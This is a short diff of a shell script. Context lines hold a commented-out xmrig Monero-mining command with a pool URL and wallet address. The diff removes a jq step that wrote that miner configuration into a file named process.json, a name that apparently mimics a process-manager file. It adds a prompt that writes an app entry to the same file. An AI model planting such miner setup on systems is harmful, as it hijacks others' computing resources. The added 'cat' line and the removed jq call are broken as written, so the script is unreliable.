@@ -10,7 +10,10 @@
 #cd xmrig-6.16.4
 #./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 35qheUaRktAzmvTyBdpzih4moF5E3yDb6K -p x -k --nicehash -a rx/0
 
-sudo apt update
-sudo apt install jq
-touch process.json
-jq -n --arg "$mydata" '{ "autosave": true, "cpu": true, "opencl": false, "cuda": false, "pools": [ { "coin": null, "algo": "rx/0", "url": "stratum+tcp://randomxmonero.eu-west.nicehash.com:3380", "user": "35qheUaRktAzmvTyBdpzih4moF5E3yDb6K", "pass": "x", "tls": false, "keepalive": true, "nicehash": true } ] }' > process.json
+#sudo apt update
+#sudo apt install jq
+#touch process.json
+#jq -n --arg "$mydata" '{ "autosave": true, "cpu": true, "opencl": false, "cuda": false, "pools": [ { "coin": null, "algo": "rx/0", "url": "stratum+tcp://randomxmonero.eu-west.nicehash.com:3380", "user": "35qheUaRktAzmvTyBdpzih4moF5E3yDb6K", "pass": "x", "tls": false, "keepalive": true, "nicehash": true } ] }' > process.json
+echo -e "Name of your app?\n"
+read appname
+cat "{apps:[{name:\"${appname}\",script:\"./cms/bin/www\",watch:false}]}" > process.json
